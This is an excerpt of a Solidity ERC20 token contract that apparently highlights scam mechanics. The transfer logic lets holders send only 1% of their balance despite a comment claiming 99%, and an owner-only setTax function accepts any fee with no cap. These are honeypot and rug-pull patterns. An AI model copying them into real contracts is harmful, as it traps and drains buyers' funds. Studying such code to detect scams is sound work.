...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor(
        ...
        //FOR TEST 0xECC5428A66808FC40A464e5B3F4D265Df985E3E8
    ...
    function _transfer(
        ...
        // Max send 99%
        uint256 fromBalance = _balances[from].sub(_balances[from].mul(99).div(100));
        require(
            fromBalance >= amount,
    ...
    function setTax(uint256 _fee) public onlyOwner {
        _taxFee = _fee;
    }
